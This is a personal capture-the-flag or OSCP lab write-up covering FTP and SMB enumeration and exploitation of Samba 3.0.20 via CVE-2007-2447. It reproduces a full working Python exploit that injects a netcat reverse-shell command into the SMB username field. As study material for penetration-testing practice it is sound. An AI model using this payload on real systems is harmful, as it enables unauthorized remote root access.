#enumeration 
port 21,139,22,445 were open 
first tried anonnymous ftp login was successful but nothing useful as directory listing was there
smbclient was also disabled as there was no smb enumeration
so we tried to find exploits for 
1.vsftpd 2.3.4
2.smbd 3.0.20-Debian
searcploit result:
```

Both of them were metasploit ones but some wise men advised me not to use metasploit at one go for OSCP so I tried to find some exploits online
I found a very useful article with describes full enumeration and seraching exploit or CVE via nmap 
link:https://www.hackingarticles.in/smb-penetration-testing-port-445/
However the nmap script failed 
After a few google searches found tha samba-3.0.20 is vulnerable to RCE.I also 
found this https://www.exploit-db.com/exploits/16320 the same exploit as the searchsploit one and I also got the CVE:2007-2447 from this.
Finally found a python script in github which appeared useful.
```

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)
```

i also had found other links but they were not that useful or I couldn't understand them
other links:https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851
This python scrpit was just OP as we got to root directly
Now I tried the metasploit one
I also tried the ftp one but it was not exploitable through meta sploit as well.

#doubts:ftp directory listing
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
Can we enable it??
